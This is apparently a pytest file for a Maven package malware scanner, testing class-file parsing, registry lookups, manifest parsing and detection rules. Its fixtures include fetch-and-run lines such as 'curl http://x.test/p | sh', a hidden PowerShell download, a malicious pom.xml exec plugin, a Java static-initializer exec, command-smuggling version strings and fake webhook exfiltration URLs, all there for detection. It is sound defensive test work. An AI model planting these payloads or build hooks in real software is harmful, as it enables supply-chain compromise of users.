# ruff: noqa: E501
"""Maven 어댑터 — 오프라인 테스트 (httpx.MockTransport + MemoryTree + 합성 클래스 파일)."""

from __future__ import annotations

import asyncio
import io
import struct
import zipfile

import httpx
import pytest

import ecosystems
from api.schemas import Severity
from common.archive import ArchiveError
from common.pypi import PackageNotFound, PyPIError
from ecosystems.maven.classfile import ClassFileError, parse_constant_pool
from engine.rules.base import MemoryTree

ADAPTER = ecosystems.get("maven")


def _run(coro):
    return asyncio.run(coro)


def _client(handler) -> httpx.AsyncClient:
    return httpx.AsyncClient(transport=httpx.MockTransport(handler))


# ── 합성 클래스 파일 ──

def make_class(this_name: str, *, classes=(), strings=(), methods=()) -> bytes:
    """상수 풀만 있는 최소 클래스 파일. methods = [(클래스, 메서드명)]."""
    pool: list[bytes] = []

    def add(b: bytes) -> int:
        pool.append(b)
        return len(pool)

    def utf8(s: str) -> int:
        raw = s.encode("utf-8")
        return add(b"\x01" + struct.pack(">H", len(raw)) + raw)

    def cls(name: str) -> int:
        return add(b"\x07" + struct.pack(">H", utf8(name)))

    this_idx = cls(this_name)
    for c in classes:
        cls(c)
    for s in strings:
        add(b"\x08" + struct.pack(">H", utf8(s)))
    for c, m in methods:
        nat = add(b"\x0c" + struct.pack(">HH", utf8(m), utf8("()V")))
        add(b"\x0a" + struct.pack(">HH", cls(c), nat))
    # Long 은 슬롯 2개 — 파서가 인덱스를 맞춰야 한다 (마지막에 넣어 개수만 검증)
    pool.append(b"\x05" + b"\x00" * 8)
    count = len(pool) + 2  # 1-based + Long 의 빈 슬롯
    return (struct.pack(">IHHH", 0xCAFEBABE, 0, 52, count) + b"".join(pool)
            + struct.pack(">HHH", 0x21, this_idx, 0))


def b(files: dict[str, bytes | str]) -> MemoryTree:
    """MemoryTree 는 문자열만 — 바이트는 latin-1 로 담는다 (규칙의 읽기 쪽과 짝)."""
    return MemoryTree({k: v.decode("latin-1") if isinstance(v, bytes) else v for k, v in files.items()})


def _scan(files):
    return ADAPTER.analyze_tree(b(files))


def _sev(findings, rule=None):
    return {f.severity for f in findings if rule is None or f.rule == rule}


# ── 클래스 파일 파서 ──

def test_constant_pool_parser_extracts_names_and_strings():
    data = make_class("evil/Proc", classes=["java/lang/ProcessBuilder"],
                      strings=["curl http://x.test | sh"],
                      methods=[("java/lang/Runtime", "exec")])
    c = parse_constant_pool(data)
    assert c.this_class == "evil/Proc"
    assert "java/lang/ProcessBuilder" in c.classes and "java/lang/Runtime" in c.classes
    assert "curl http://x.test | sh" in c.strings
    assert ("java/lang/Runtime", "exec") in c.methods


@pytest.mark.parametrize("bad", [b"", b"PK\x03\x04" + b"\x00" * 20, b"\xca\xfe\xba\xbe\x00\x00\x00\x34\x00\x10"])
def test_constant_pool_parser_rejects_garbage(bad):
    with pytest.raises(ClassFileError):
        parse_constant_pool(bad)


def test_constant_pool_parser_truncated():
    data = make_class("a/B", strings=["hello world"])
    with pytest.raises(ClassFileError):
        parse_constant_pool(data[:30])


def test_constant_pool_parser_unknown_tag():
    data = struct.pack(">IHHH", 0xCAFEBABE, 0, 52, 3) + b"\x63\x00\x00"
    with pytest.raises(ClassFileError):
        parse_constant_pool(data)


# ── 검증·식별 ──

def test_adapter_loads_and_metadata():
    assert ADAPTER.id == "maven" and ADAPTER.osv_ecosystem == "Maven" and not ADAPTER.has_feed
    assert ADAPTER.purl("com.google.guava:guava", "33.0.0-jre") == "pkg:maven/com.google.guava/guava@33.0.0-jre"
    assert ADAPTER.normalize_name("Org.Foo:Bar") == "Org.Foo:Bar"


@pytest.mark.parametrize("name,ver", [
    ("com.google.guava:guava", "33.0.0-jre"), ("org.apache.commons:commons-lang3", "3.14.0"),
    ("junit:junit", "4.13.2"), ("a_b:c.d", "r03"), ("g:a", "2.0.0.Final"), ("g:a", "1.0+build5"),
])
def test_validate_accepts(name, ver):
    ADAPTER.validate(name, ver)


@pytest.mark.parametrize("name,ver", [
    ("guava", "1.0"), ("a:b:c", "1.0"), ("a b:c", "1.0"), ("a;rm:c", "1.0"), ("../x:y", "1.0"),
    ("a:..", "1.0"), ("g:a/b", "1.0"), ("g:a", "1.0; ls"), ("g:a", "../1"), ("g:a", " 1.0"),
    ("g:a", ""), (":a", "1"), ("g:", "1"),
])
def test_validate_rejects(name, ver):
    with pytest.raises(ValueError):
        ADAPTER.validate(name, ver)


# ── 레지스트리 ──

METADATA = """<?xml version="1.0" encoding="UTF-8"?>
<metadata><groupId>com.example</groupId><artifactId>lib</artifactId>
<versioning><latest>2.0</latest><release>2.0</release>
<versions><version>1.0</version><version>1.5</version><version>2.0</version></versions>
</versioning></metadata>"""


def _search_body(rows):
    return {"response": {"numFound": len(rows), "docs": rows}}


def test_registry_parses_metadata_and_search():
    seen = {}

    def handler(req: httpx.Request) -> httpx.Response:
        if req.url.host == "repo1.maven.org":
            seen["meta"] = str(req.url)
            return httpx.Response(200, text=METADATA)
        return httpx.Response(200, json=_search_body([
            {"v": "1.0", "timestamp": 1_600_000_000_000, "ec": [".jar", ".pom"]},
            {"v": "2.0", "timestamp": 1_700_000_000_000, "ec": [".jar", "-sources.jar", ".pom"]},
            {"v": "1.5", "timestamp": 1_650_000_000_000, "ec": [".pom"]},
        ]))

    async def go():
        async with _client(handler) as c:
            return await ADAPTER.fetch_project("com.example:lib", client=c)

    proj = _run(go())
    assert seen["meta"].endswith("/com/example/lib/maven-metadata.xml")
    assert proj.latest == "2.0" and set(proj.releases) == {"1.0", "1.5", "2.0"}
    assert [a.kind for a in ADAPTER.select_artifacts(proj, "2.0")] == ["jar", "sources-jar"]
    pom_only = ADAPTER.select_artifacts(proj, "1.5")
    assert [a.kind for a in pom_only] == ["pom"]
    assert pom_only[0].url == "https://repo1.maven.org/maven2/com/example/lib/1.5/lib-1.5.pom"
    jar = ADAPTER.select_artifacts(proj, "1.0")[0]
    assert jar.url.endswith("/lib/1.0/lib-1.0.jar") and jar.archive_format == "zip"
    assert proj.releases["2.0"].uploaded_at.year == 2023
    assert proj.previous_version("2.0") == "1.5"


def test_registry_search_failure_degrades_gracefully():
    def handler(req):
        if req.url.host == "repo1.maven.org":
            return httpx.Response(200, text=METADATA)
        return httpx.Response(503)

    async def go():
        async with _client(handler) as c:
            return await ADAPTER.fetch_project("com.example:lib", client=c)

    proj = _run(go())
    assert "search_error" in proj.extra
    assert proj.releases["2.0"].uploaded_at is None
    assert [a.kind for a in proj.releases["2.0"].artifacts] == ["jar", "pom"]


def test_registry_not_found():
    async def go():
        async with _client(lambda r: httpx.Response(404)) as c:
            return await ADAPTER.fetch_project("no.such:thing", client=c)

    with pytest.raises(PackageNotFound, match=r"no\.such:thing is not on Maven Central"):
        _run(go())


@pytest.mark.parametrize("resp", [
    httpx.Response(500),
    httpx.Response(200, text="<html>not xml"),
    httpx.Response(200, text='<!DOCTYPE m [<!ENTITY a "b">]><metadata/>'),
])
def test_registry_errors_are_not_not_found(resp):
    async def go():
        async with _client(lambda r: resp) as c:
            return await ADAPTER.fetch_project("g:a", client=c)

    with pytest.raises(PyPIError) as ei:
        _run(go())
    assert not isinstance(ei.value, PackageNotFound)


def test_registry_network_error():
    def boom(req):
        raise httpx.ConnectError("down")

    async def go():
        async with _client(boom) as c:
            return await ADAPTER.fetch_project("g:a", client=c)

    with pytest.raises(PyPIError):
        _run(go())


def test_pom_artifact_extract(tmp_path):
    from ecosystems.base import Artifact
    art = Artifact(filename="p-1.pom", url="https://x", kind="pom")
    root = ADAPTER.extract(b"<project/>", art, tmp_path / "o")
    assert (root / "pom.xml").read_bytes() == b"<project/>"
    with pytest.raises(ArchiveError):
        ADAPTER.extract(b"x" * (3 * 1024 * 1024), art, tmp_path / "o2")


def test_jar_artifact_extract(tmp_path):
    from ecosystems.base import Artifact
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("META-INF/MANIFEST.MF", "Manifest-Version: 1.0\n")
    art = Artifact(filename="p-1.jar", url="https://x", kind="jar", archive_format="zip")
    root = ADAPTER.extract(buf.getvalue(), art, tmp_path / "j")
    assert (root / "META-INF" / "MANIFEST.MF").exists()


# ── 규칙 ──

def test_ordinary_library_is_clean():
    files = {
        "META-INF/MANIFEST.MF": "Manifest-Version: 1.0\nBundle-Name: Guava\n",
        "com/g/Util.class": make_class("com/g/Util", classes=["java/util/List"], strings=["hello"]),
        "com/g/Net.class": make_class("com/g/Net", classes=["java/net/URL"], strings=["https://example.com/api"]),
    }
    assert _scan(files) == []


def test_agent_manifest_is_medium():
    f = _scan({"META-INF/MANIFEST.MF": "Manifest-Version: 1.0\nPremain-Class: a.Agent\nAgent-Class: a.Agent\n"})
    assert _sev(f) == {Severity.MEDIUM} and f[0].rule == "maven-java-agent"


def test_manifest_continuation_lines():
    mf = "Manifest-Version: 1.0\nPremain-Class: com.very.long.pa\n ckage.Agent\n"
    f = _scan({"META-INF/MANIFEST.MF": mf})
    assert "com.very.long.package.Agent" in f[0].detail


def test_ordinary_annotation_processor_is_medium():
    files = {
        "META-INF/services/javax.annotation.processing.Processor": "a.b.Proc\n",
        "a/b/Proc.class": make_class("a/b/Proc", classes=["javax/annotation/processing/AbstractProcessor"],
                                     strings=["generated"]),
    }
    f = _scan(files)
    assert _sev(f) == {Severity.MEDIUM} and f[0].rule == "maven-annotation-processor"
    assert ADAPTER.has_install_script(None, "1", list(files))  # type: ignore[arg-type]


def test_malicious_processor_class_is_high():
    files = {
        "META-INF/services/javax.annotation.processing.Processor": "a.b.Proc\n",
        "a/b/Proc.class": make_class("a/b/Proc", classes=["java/net/URL"],
                                     strings=["powershell -w hidden iwr http://x.test/a"],
                                     methods=[("java/lang/Runtime", "exec"), ("java/net/URL", "openStream")]),
    }
    assert Severity.HIGH in _sev(_scan(files), "maven-annotation-processor")


def test_service_provider_with_exec_and_network_high():
    files = {
        "META-INF/services/com.acme.Plugin": "x.Impl\n",
        "x/Impl.class": make_class("x/Impl", methods=[("java/lang/Runtime", "exec"), ("java/net/URL", "openConnection")],
                                   classes=["java/net/URL"]),
    }
    assert Severity.HIGH in _sev(_scan(files), "maven-service-loader-exec")


def test_class_webhook_token_is_high_anywhere():
    hook = "https://discord.com/api/webhooks/123456789012345678/" + "a" * 40
    f = _scan({"x/Y.class": make_class("x/Y", strings=[hook])})
    assert Severity.HIGH in _sev(f, "maven-exfil-endpoint")


def test_class_exec_with_suspicious_string_is_medium_only():
    f = _scan({"x/Y.class": make_class("x/Y", strings=["curl -s http://x.test/a | sh"],
                                       methods=[("java/lang/Runtime", "exec")])})
    assert _sev(f) == {Severity.MEDIUM}
    # 문자열만 있고 실행 참조가 없으면 아무것도 내지 않는다 (문서·도움말 문자열)
    assert _scan({"x/Z.class": make_class("x/Z", strings=["use curl to test"])}) == []


def test_class_suspect_hosts_medium():
    f = _scan({"x/Y.class": make_class("x/Y", strings=["https://abc.ngrok.io/x", "http://127.0.0.1:8080/", "http://10.0.0.1/"])})
    assert _sev(f) == {Severity.MEDIUM}
    f = _scan({"x/Y.class": make_class("x/Y", strings=["http://8.8.4.4/payload"])})
    assert _sev(f) == {Severity.MEDIUM}


def test_corrupt_class_file_is_skipped_not_crash():
    assert _scan({"x/Bad.class": "garbage"}) == []


JAVA_EVIL = """package a;
public class Evil {
    static {
        try {
            String s = new String(java.util.Base64.getDecoder().decode("AAAA"));
            Runtime.getRuntime().exec("sh -c 'curl http://x.test/p | sh'");
        } catch (Exception e) {}
    }
    void other() { Runtime.getRuntime().exec("ls"); }
}
"""

JAVA_OK = """package a;
public class Ok {
    private static final String S = "static { Runtime.getRuntime().exec(\\"x\\"); }";
    static { System.setProperty("a", "b"); }
    void run() throws Exception { new ProcessBuilder("git", "status").start(); }
}
"""


def test_java_static_init_exec_high_vs_ordinary():
    f = _scan({"a/Evil.java": JAVA_EVIL})
    assert Severity.HIGH in _sev(f, "maven-static-init-exec") and f[0].location.startswith("a/Evil.java:3")
    assert _scan({"a/Ok.java": JAVA_OK}) == []


def test_java_static_init_exec_alone_is_medium():
    src = 'class A { static { try { Runtime.getRuntime().exec("make"); } catch (Exception e) {} } }'
    assert _sev(_scan({"A.java": src}), "maven-static-init-exec") == {Severity.MEDIUM}


def test_java_processor_source_with_network_exec_high():
    src = """import javax.annotation.processing.AbstractProcessor;
class P extends AbstractProcessor { boolean process() {
  new java.net.URL("http://x.test").openStream(); Runtime.getRuntime().exec("id"); return false; } }"""
    assert Severity.HIGH in _sev(_scan({"P.java": src}), "maven-annotation-processor")


def test_java_webhook_in_source_high():
    hook = "https://api.telegram.org/bot123456:" + "A" * 35
    assert Severity.HIGH in _sev(_scan({"A.java": f'class A {{ String u = "{hook}"; }}'}), "maven-exfil-endpoint")


POM_PARENT_EVIL = """<project xmlns="http://maven.apache.org/POM/4.0.0"><packaging>pom</packaging>
<build><plugins><plugin><artifactId>exec-maven-plugin</artifactId><executions><execution>
<phase>validate</phase><goals><goal>exec</goal></goals>
<configuration><executable>sh</executable><arguments><argument>-c</argument>
<argument>curl http://x.test/p | sh</argument></arguments></configuration>
</execution></executions></plugin></plugins></build></project>"""


def test_pom_parent_exec_plugin_high_and_jar_pom_medium():
    assert Severity.HIGH in _sev(_scan({"pom.xml": POM_PARENT_EVIL}), "maven-pom-exec-plugin")
    child = POM_PARENT_EVIL.replace("<packaging>pom</packaging>", "<packaging>jar</packaging>")
    assert _sev(_scan({"META-INF/maven/g/a/pom.xml": child}), "maven-pom-exec-plugin") == {Severity.MEDIUM}


def test_pom_benign_exec_plugin_and_plugin_management():
    benign = """<project><packaging>jar</packaging><build><plugins><plugin>
<artifactId>exec-maven-plugin</artifactId><configuration><executable>java</executable></configuration>
</plugin></plugins></build></project>"""
    assert _scan({"pom.xml": benign}) == []
    mgmt = POM_PARENT_EVIL.replace("<build><plugins>", "<build><pluginManagement><plugins>").replace(
        "</plugins></build>", "</plugins></pluginManagement></build>")
    assert _scan({"pom.xml": mgmt}) == []


def test_pom_foreign_repository_and_system_scope():
    pom = """<project><repositories>
<repository><id>c</id><url>https://repo.maven.apache.org/maven2</url></repository>
<repository><id>x</id><url>http://repo.evil.test/maven</url></repository></repositories>
<dependencies><dependency><groupId>g</groupId><artifactId>a</artifactId><scope>system</scope></dependency></dependencies>
</project>"""
    f = _scan({"pom.xml": pom})
    repo = [x for x in f if x.rule == "maven-foreign-repository"]
    assert len(repo) == 1 and "repo.evil.test" in repo[0].detail and "http" in repo[0].detail
    assert [x.rule for x in f if x.severity == Severity.LOW] == ["maven-system-scope"]


def test_pom_with_doctype_reported_not_parsed():
    f = _scan({"pom.xml": '<!DOCTYPE p [<!ENTITY a "b">]><project>&a;</project>'})
    assert f and "해석하지 못함" in f[0].detail


def test_plugin_descriptor_low():
    f = _scan({"META-INF/maven/plugin.xml": "<plugin/>"})
    assert [(x.rule, x.severity) for x in f] == [("maven-plugin-descriptor", Severity.LOW)]
    assert ADAPTER.has_install_script(None, "1", ["META-INF/maven/plugin.xml"])  # type: ignore[arg-type]


def _nested_jar(files: dict[str, bytes | str]) -> str:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for k, v in files.items():
            zf.writestr(k, v)
    return buf.getvalue().decode("latin-1")


def test_nested_jar_one_level_scan():
    inner = _nested_jar({"META-INF/MANIFEST.MF": "Manifest-Version: 1.0\nPremain-Class: n.A\n",
                         "n/Y.class": make_class("n/Y", strings=["https://discord.com/api/webhooks/123456789012345678/" + "b" * 40])})
    f = ADAPTER.analyze_tree(MemoryTree({"BOOT-INF/lib/inner.jar": inner}))
    rules = {(x.rule, x.severity) for x in f}
    assert ("maven-nested-jar", Severity.LOW) in rules
    assert ("maven-exfil-endpoint", Severity.HIGH) in rules
    assert any("inner.jar!/n/Y.class" in x.location for x in f)
    assert f[0].severity == Severity.HIGH  # 최악 먼저


def test_nested_jar_not_zip_is_reported_and_no_recursion():
    f = ADAPTER.analyze_tree(MemoryTree({"lib/bad.jar": "not a zip"}))
    assert any(x.rule == "maven-nested-jar" and x.severity == Severity.MEDIUM for x in f)
    inner2 = _nested_jar({"META-INF/MANIFEST.MF": "Premain-Class: x.A\n"})
    outer = _nested_jar({"in.jar": inner2})
    f = ADAPTER.analyze_tree(MemoryTree({"lib/outer.jar": outer}))
    assert not any(x.rule == "maven-java-agent" for x in f)  # 한 단계만


def test_findings_sorted_and_cwes_registered():
    files = {
        "META-INF/MANIFEST.MF": "Premain-Class: a.A\n",
        "x/Y.class": make_class("x/Y", strings=["https://discord.com/api/webhooks/123456789012345678/" + "c" * 40]),
        "pom.xml": "<project><repositories><repository><url>https://r.evil.test/m</url></repository></repositories></project>",
    }
    f = _scan(files)
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    assert [order[x.severity.value] for x in f] == sorted(order[x.severity.value] for x in f)
    cwes = ADAPTER.rule_cwes()
    assert all(x.rule in cwes and x.cwe in cwes[x.rule] for x in f)
    assert all(r.startswith("maven-") for r in cwes)


# ── 매니페스트 ──

def test_pom_manifest():
    pom = """<project><properties><v>1</v></properties>
<dependencyManagement><dependencies><dependency><groupId>m</groupId><artifactId>managed</artifactId><version>9</version></dependency></dependencies></dependencyManagement>
<dependencies>
 <dependency><groupId>com.google.guava</groupId><artifactId>guava</artifactId><version>33.0.0-jre</version></dependency>
 <dependency><groupId>g</groupId><artifactId>prop</artifactId><version>${v}</version></dependency>
 <dependency><groupId>g</groupId><artifactId>managed</artifactId></dependency>
 <dependency><groupId>g</groupId><artifactId>range</artifactId><version>[1.0,2.0)</version></dependency>
 <dependency><groupId>g</groupId><artifactId>exact</artifactId><version>[1.2.3]</version></dependency>
 <dependency><groupId>${project.groupId}</groupId><artifactId>self</artifactId><version>1</version></dependency>
</dependencies></project>"""
    deps = {d.name: d for d in ADAPTER.parse_manifest("pom.xml", pom)}
    assert set(deps) == {"com.google.guava:guava", "g:prop", "g:managed", "g:range", "g:exact"}
    assert deps["com.google.guava:guava"].version == "33.0.0-jre" and deps["com.google.guava:guava"].direct
    assert deps["g:prop"].version is None and deps["g:prop"].spec == "${v}"
    assert deps["g:managed"].version is None and deps["g:range"].version is None
    assert deps["g:exact"].version == "1.2.3"
    with pytest.raises(ValueError):
        ADAPTER.parse_manifest("pom.xml", "<project>")
    with pytest.raises(ValueError):
        ADAPTER.parse_manifest("pom.xml", '<!DOCTYPE p [<!ENTITY a "b">]><project/>')


def test_gradle_lockfile():
    text = "# comment\ncom.google.guava:guava:33.0.0-jre=compileClasspath,runtimeClasspath\nempty=annotationProcessor\n"
    deps = ADAPTER.parse_manifest("gradle.lockfile", text)
    assert [(d.name, d.version) for d in deps] == [("com.google.guava:guava", "33.0.0-jre")]
    with pytest.raises(ValueError):
        ADAPTER.parse_manifest("gradle.lockfile", "garbage=x")


def test_build_gradle_best_effort():
    text = """plugins { id 'java' }
dependencies {
    implementation 'org.slf4j:slf4j-api:2.0.9'
    testImplementation("junit:junit:4.13.2")
    api "com.x:y:$ver"
    implementation group: 'org.a', name: 'b', version: '1.1'
    implementation libs.some.catalog
    // implementation 'commented:out:1'
}"""
    deps = {d.name: d for d in ADAPTER.parse_manifest("build.gradle", text)}
    assert deps["org.slf4j:slf4j-api"].version == "2.0.9"
    assert deps["junit:junit"].version == "4.13.2"
    assert deps["com.x:y"].version is None and deps["com.x:y"].spec == "$ver"
    assert deps["org.a:b"].version == "1.1"
    assert "commented:out" not in deps
    kts = ADAPTER.parse_manifest("build.gradle.kts", 'dependencies { implementation("a:b:1.0") }')
    assert kts[0].version == "1.0"
